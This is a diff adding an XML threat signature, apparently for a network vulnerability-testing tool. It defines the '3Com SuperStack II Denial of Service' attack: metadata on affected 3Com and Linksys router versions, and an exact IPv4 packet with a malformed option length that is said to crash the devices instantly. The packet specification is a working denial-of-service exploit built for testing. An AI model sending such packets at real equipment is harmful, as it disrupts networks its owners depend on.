@@ -1,0 +1,69 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="3Com SuperStack II Denial of Service"/>
+    <EngDesc display="true" value="This threat sends a malformed IP option length parameter.  This causes some network devices to crash instantly."/>
+    <Intent display="true">
+      <item value="Crashing"/>
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="IP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Router"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="3Com"/>
+      <item value="Linksys"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="3Com_Superstack"/>
+      <item value="Linksys_BEFVP41"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="3Com_Superstack_RAS_1500"/>
+      <item value="Linksys_BEFVP41_1.01.04"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.securityfocus.com/archive/1/421929/30/0/threaded"/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value="7175"/>
+    <OSVDB display="true" value="22514"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID value="8782522ec86706cabe25697944d1249d" display="true"/>
+    <Revision value="1" display="true"/>
+    <Safe display="true" value="false"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="availability"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632730960001211250"/>
+    <Created value="1143090484" display="true"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="6" TypeofService="0" TotalLength="002c" Identification="@random(0,FFFF)" FragmentOffset="0000" TTL="ff" Protocol="aa" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="e4000000" Payload="4142434445464748494a4b4c4d4e4f5052535455" CE="false" DF="false" MF="false"/>
+    </Ethernet>
+  </Output>
+</threatSignature>
